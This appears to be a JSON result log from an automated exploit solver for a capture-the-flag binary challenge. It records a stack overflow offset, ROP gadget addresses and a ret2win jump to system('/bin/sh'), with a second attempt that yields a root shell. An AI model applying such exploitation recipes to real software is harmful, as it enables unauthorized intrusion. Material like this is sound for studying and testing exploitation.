@@ -1,0 +1,54 @@
+{
+  "name": "ch05_82cf",
+  "ok": true,
+  "strategy": "ret2win",
+  "detail": "jump to system(\"/bin/sh\") @ 0x400596 off=136 align=1",
+  "elapsed": 1.3,
+  "attempt_count": 2,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "None",
+      "static": false
+    },
+    "vulns": [
+      "read@0x4005bf disp=-128 off=136 limit=512"
+    ],
+    "wins": [
+      "shell@0x400596(system(\"/bin/sh\"))"
+    ],
+    "binsh": "0x400684",
+    "gadgets": {
+      "pop_rdi": "0x400663",
+      "pop_rbp": "0x400500",
+      "ret": "0x400431",
+      "leave": "0x4005c4"
+    },
+    "csu": true,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x400596 off=136 align=0",
+      "ok": false,
+      "elapsed": 0.31,
+      "tail": "Hello, World\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x400596 off=136 align=1",
+      "ok": true,
+      "elapsed": 0.86,
+      "tail": "Hello, World\nPWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
